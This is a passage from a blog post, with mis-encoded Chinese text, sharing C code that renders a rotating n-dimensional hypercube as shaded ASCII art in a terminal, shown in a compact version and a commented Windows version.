normalIndex=<span class="number">0</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++)&#123;</span><br><span class="line">                    <span class="keyword">float</span> vec1[<span class="number">3</span>],vec2[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        vec1[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">1</span>]*dimension+i];</span><br><span class="line">                        vec2[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">2</span>]*dimension+i];&#125;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]=vec1[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>]*vec2[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]-vec1[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]*vec2[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">float</span> normalLength=calLength(&amp;normalResultSet[<span class="number">3</span>*normalIndex],<span class="number">3</span>);</span><br><span class="line">                    <span class="keyword">if</span>(normalLength!=<span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]/=normalLength;</span><br><span class="line">                    <span class="keyword">if</span>(!transparent)&#123;</span><br><span class="line">                        <span class="keyword">float</span> slidedVec[<span class="number">3</span>],slideLength,vexLength=calLength(&amp;vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension],<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) slidedVec[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]+normalResultSet[<span class="number">3</span>*normalIndex+i];</span><br><span class="line">                        slideLength=calLength(slidedVec,<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">if</span>(slideLength&gt;vexLength)</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]*=<span class="number">-1</span>;&#125;&#125;&#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> axis=<span class="number">0</span>;axis&lt;d;axis++) vexProjected[vexIndex*dimension+axis]=vexProjected[vexIndex*dimension+axis]*lightSrcDis/(lightSrcDis-vexProjected[vexIndex*dimension+d]);&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> sx=<span class="number">0</span>;sx&lt;size;sx++) <span class="keyword">for</span>(<span class="keyword">int</span> sy=<span class="number">0</span>;sy&lt;size;sy++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>,inside=<span class="number">1</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++,inside=<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">float</span> tCenter[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">                <span class="keyword">float</span> x[<span class="number">3</span>],y[<span class="number">3</span>],z[<span class="number">3</span>],xb[<span class="number">3</span>],yb[<span class="number">3</span>];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                    x[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension];</span><br><span class="line">                    tCenter[<span class="number">0</span>]+=x[i];</span><br><span class="line">                    y[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">1</span>];</span><br><span class="line">                    tCenter[<span class="number">1</span>]+=y[i];</span><br><span class="line">                    z[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">2</span>];</span><br><span class="line">                    xb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>];</span><br><span class="line">                    yb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>+<span class="number">1</span>];&#125;</span><br><span class="line">                tCenter[<span class="number">0</span>]/=<span class="number">3</span>;tCenter[<span class="number">1</span>]/=<span class="number">3</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>&amp;&amp;inside;i++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(     ((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            ?(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            :(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>]))</span><br><span class="line">                            ||((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])+eOffest&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            &amp;&amp;(tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])-eOffest&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])))</span><br><span class="line">                        inside=<span class="number">0</span>;&#125;</span><br><span class="line">                <span class="keyword">if</span>(inside)&#123;<span class="keyword">float</span> alpha,currentDis,p[<span class="number">4</span>];</span><br><span class="line">                    <span class="keyword">if</span>(transparent) out_f[sy][sx]=out_f[sy][sx]&lt;<span class="number">0</span>?<span class="number">1</span>:out_f[sy][sx]+<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        p[<span class="number">0</span>]= yb[<span class="number">0</span>]*z[<span class="number">1</span>] -yb[<span class="number">0</span>]*z[<span class="number">2</span>] -yb[<span class="number">1</span>]*z[<span class="number">0</span>] +yb[<span class="number">1</span>]*z[<span class="number">2</span>] +yb[<span class="number">2</span>]*z[<span class="number">0</span>] -yb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">1</span>]=-xb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">0</span>]*z[<span class="number">2</span>] +xb[<span class="number">1</span>]*z[<span class="number">0</span>] -xb[<span class="number">1</span>]*z[<span class="number">2</span>] -xb[<span class="number">2</span>]*z[<span class="number">0</span>] +xb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">2</span>]= xb[<span class="number">0</span>]*yb[<span class="number">1</span>] -xb[<span class="number">0</span>]*yb[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">0</span>] +xb[<span class="number">1</span>]*yb[<span class="number">2</span>] +xb[<span class="number">2</span>]*yb[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">3</span>]=-xb[<span class="number">0</span>]*yb[<span class="number">1</span>]*z[<span class="number">2</span>] +xb[<span class="number">0</span>]*yb[<span class="number">2</span>]*z[<span class="number">1</span>] +xb[<span class="number">1</span>]*yb[<span class="number">0</span>]*z[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">2</span>]*z[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">2</span>]*yb[<span class="number">1</span>]*z[<span class="number">0</span>];</span><br><span class="line">                        currentDis=lightSrcDis*(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)+p[<span class="number">3</span>])/(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)-p[<span class="number">2</span>]*lightSrcDis);</span><br><span class="line">                        <span class="keyword">if</span>(currentDis&gt;dis[sy][sx])&#123;</span><br><span class="line">                            alpha=<span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) alpha+=normalResultSet[normalIndex*<span class="number">3</span>+i]*light[i];</span><br><span class="line">                            dis[sy][sx]=currentDis;</span><br><span class="line">                            out_f[sy][sx]=alpha&gt;<span class="number">1</span>||alpha&lt;<span class="number">-1</span>?alpha&gt;<span class="number">1</span>?<span class="number">10</span>:<span class="number">0</span>:(alpha*<span class="number">10</span>+<span class="number">10</span>)*<span class="number">0.5</span>;&#125;&#125;&#125;&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,outIndex;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!transparent) outIndex=(<span class="keyword">int</span>)out_f[i][j];</span><br><span class="line">                <span class="keyword">else</span> outIndex=(<span class="keyword">int</span>)(<span class="built_in">pow</span>((<span class="number">1</span><span class="number">-1</span>/(transparent*out_f[i][j]+<span class="number">1</span>)),<span class="number">2</span>)*<span class="number">10</span>);</span><br><span class="line">                out_f[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[outIndex],shade[outIndex]):<span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            &#125;<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;<span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);<span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);usleep(<span class="number">30000</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>    </div></div><p>ä»¥ä¸Šä»£ç åªæ˜¯çœ‹èµ·æ¥æ¯”è¾ƒå¥½çœ‹ï¼Œä»¥ä¸‹æ˜¯ä»¥ä¸‹æ˜¯å¸¦æ³¨é‡Šä¸æµ‹è¯•ä»£ç çš„æºç ï¼Œç¯å¢ƒæ˜¯winï¼Œlinuxçš„è¯æŠŠæ¸…å±éƒ¨åˆ†çš„ä»£ç ç¨å¾®æ”¹æ”¹å³å¯ï¼Œå¯ä»¥å‚è€ƒå‰æ–‡æåˆ°çš„ä¹‹å‰çš„åšå®¢<a href="https://kyriota.com/2021/04/19/Render3D-ObjectInTerminal/">Render 3D Object In Terminal</a></p><div class='spoiler collapsed'>    <div class='spoiler-title'>        æ³¨é‡Šç‰ˆ    </div>    <div class='spoiler-content'>        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 8.0<span class="comment">//ç«‹æ–¹ä½“è¾¹é•¿</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pi 3.1415926</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 55<span class="comment">//è§å¹•å¤§å°</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> delta 0.5<span class="comment">//éå†æ–¹å—çš„æ­¥é•¿</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> deltaA 0.02<span class="comment">//ç‰©ä½“æ—‹è½¬é€Ÿåº¦</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> eOffest 0.001<span class="comment">//åˆ¤å®šç‚¹æ˜¯å¦åœ¨å¹³é¢å†…æ—¶çš„æ–¹ç¨‹é˜ˆå€¼</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dimension 5<span class="comment">//ç»´æ•°</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> transparent 0<span class="comment">//æ˜¯å¦ä½¿ç”¨é€æ˜æè´¨ï¼ŒåŒæ—¶æ˜¯é€æ˜çš„å€ç‡ï¼Œå››ç»´æ¨è0.75ï¼Œäº”ç»´æ¨è0.6</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åæ ‡ç³»è¯´æ˜ï¼šxå‘å³ï¼Œyå‘ä¸‹ï¼Œzå‘å‰</span></span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,:;!om0&amp;%@&quot;</span>;<span class="comment">//é˜´å½±å­—ç¬¦é›†åä¸€ä¸ªï¼Œä¾¿äºé€‰å–</span></span><br><span class="line"><span class="keyword">float</span> lightSrcDis=<span class="number">5</span>*a;<span class="comment">//é€è§†æŠ•å½±æ—¶çš„å…‰æºè·ç¦»</span></span><br><span class="line"><span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-2</span>,<span class="number">5</span>,<span class="number">0.8</span>&#125;;<span class="comment">//å¹³è¡Œå…‰å‘é‡ï¼Œé€‰å–äº†ä¸€ä¸ªæ¯”è¾ƒèˆ’æœçš„æ‰“å…‰</span></span><br><span class="line"><span class="keyword">int</span> rotateAround[]=&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>&#125;;<span class="comment">//ç¡®å®šæ—‹è½¬åŸºå‡†ï¼ŒæŒ‡å®šå‚ä¸æ—‹è½¬çš„æ–¹å‘ï¼Œä¸¤ä¸ªä¸€ç»„ï¼Œä¸€ç»„ä¸­å°çš„åœ¨å‰å¤§çš„åœ¨å</span></span><br><span class="line"><span class="keyword">float</span> vAxis[]     =&#123; <span class="number">3</span> , <span class="number">2</span> , <span class="number">1</span> &#125;;<span class="comment">//å¯¹åº”ä¸Šè¾¹çš„é…é€Ÿå€ç‡</span></span><br><span class="line"><span class="keyword">float</span> initialCam[<span class="number">3</span>]=&#123;<span class="number">0</span>,pi*<span class="number">5</span>/<span class="number">24</span>,<span class="number">0</span>&#125;;<span class="comment">//æ°´å¹³æ—‹è½¬ å‰åå€¾æ–œ å·¦å³å€¾æ–œï¼Œæ³¨æ„ç”¨å¼§åº¦è§’ï¼Œå¦‚ pi/4</span></span><br><span class="line"><span class="comment">/*initialObj[å·²åˆ é™¤]ï¼šæ­£æ–¹ä½“åˆå§‹æ‘†æ”¾çš„è§’åº¦ï¼›initialObjï¼šæ‘„åƒæœºåˆå§‹æ‘†æ”¾çš„è§’åº¦</span></span><br><span class="line"><span class="comment">æ—‹è½¬é¡ºåºï¼šinitialObj â†’ rotateAround â†’ initialCam</span></span><br><span class="line"><span class="comment">initialObjæ„Ÿè§‰ç”¨å¤„ä¸å¤§ï¼Œåˆ äº†ç®—äº†*/</span></span><br><span class="line"><span class="comment">/*è®¡ç®—å‘é‡æ¨¡é•¿</span></span><br><span class="line"><span class="comment">--------------------</span></span><br><span class="line"><span class="comment">Par:</span></span><br><span class="line"><span class="comment">    vec[]ï¼šå‘é‡</span></span><br><span class="line"><span class="comment">    lenï¼šå…ƒç´ ä¸ªæ•°</span></span><br><span class="line"><span class="comment">--------------------*/</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">calLength</span><span class="params">(<span class="keyword">float</span> *vec,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++) result+=vec[i]*vec[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    COORD pos=&#123;<span class="number">0</span>,<span class="number">0</span>&#125;;<span class="comment">//å…‰æ ‡å›é›¶</span></span><br><span class="line">    <span class="keyword">float</span> lightLength=calLength(&amp;light[<span class="number">0</span>],<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) light[i]/=lightLength;<span class="comment">//å•ä½åŒ–å¹³è¡Œå…‰å‘é‡</span></span><br><span class="line">    <span class="keyword">float</span> out_f[size][size],dis[size][size]=&#123;(<span class="keyword">float</span>)<span class="number">4</span>*size&#125;;<span class="comment">//è®°å½•äº®åº¦ï¼Œæ˜ å°„åˆ°å­—ç¬¦é›† | è®°å½•ä¸‰ç»´æŠ•å½±ååˆ°å±å¹•æœ€å°è·ç¦»ï¼Œç”±æ­¤åˆ¤æ–­é®ç½©å…³ç³»</span></span><br><span class="line">    <span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;<span class="comment">//ä»åæ ‡åŸç‚¹(å±å¹•å·¦ä¸Šè§’)åç§»åˆ°å±å¹•ä¸­å¿ƒæ‰€éœ€çš„åç§»é‡</span></span><br><span class="line">    <span class="keyword">int</span> face=((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension<span class="number">-3</span>)*dimension*(dimension<span class="number">-1</span>)));</span><br><span class="line">    <span class="comment">/*  é¢æ•°å…¬å¼è§£é‡Š</span></span><br><span class="line"><span class="comment">        æ¯ä¸ª n ç»´æ­£æ–¹ä½“ä¸­çš„æ¯ä¸ª m ç»´è¾¹ç•Œéƒ½ä¼šè¢« n-m ä¸ª m+1 ç»´è¾¹ç•Œå…±ç”¨ã€‚æ¯”å¦‚æ­£å…­é¢ä½“ä¸­ï¼Œæ¯æ¡æ£±è¢«ä¸¤ä¸ªé¢å…±ç”¨ï¼Œè€Œæ¯ä¸ªé¡¶ç‚¹è¢«ä¸‰æ¡æ£±å…±ç”¨ã€‚</span></span><br><span class="line"><span class="comment">        è¿™æ ·ç®—æ¥ï¼Œå¯¹äºä»»æ„ä¸€ä¸ª n ç»´çš„æ­£æ–¹ä½“ï¼Œè®¡ç®—å…¶ä¸é‡å¤çš„äºŒç»´æ­£æ–¹å½¢è¡¨é¢çš„æ•°é‡åº”è¯¥ä¸ºï¼š</span></span><br><span class="line"><span class="comment">          6x8x10x...x(2n)/(2*3*...*(n-2))</span></span><br><span class="line"><span class="comment">        =(2^(n-2))*(n!)/2/(n-2)!</span></span><br><span class="line"><span class="comment">        =(2^(n-3))*n*(n-1)*/</span></span><br><span class="line">    <span class="keyword">int</span> vexNum=(<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension))*dimension;<span class="comment">//é¡¶ç‚¹ä¸ªæ•°*ç»´æ•°</span></span><br><span class="line">    <span class="keyword">int</span> vexLink[vexNum],normalLink[<span class="number">6</span>*face];<span class="comment">//ç›¸é‚»é¡¶ç‚¹é›†ï¼Œå¦‚ï¼šä¸‰ç»´ä¸­0å·é¡¶ç‚¹ä¸1ï¼Œ3ï¼Œ7ç›¸é‚»ï¼Œåˆ™å‰dimensionä¸ªå…ƒç´ ä¸º1ï¼Œ3ï¼Œ7 | åŒç†ï¼Œæ³•å‘é‡å¯¹åº”ä¸‰è§’å½¢é¢çš„ä¸‰ä¸ªvexçš„index</span></span><br><span class="line">    <span class="keyword">float</span> vex[vexNum],vexO[vexNum],vexProjected[vexNum],vexTemp[vexNum];<span class="comment">//å½“å‰é¡¶ç‚¹åæ ‡ | åŸå§‹é¡¶ç‚¹åæ ‡ | æŠ•å½±åé¡¶ç‚¹åæ ‡ | 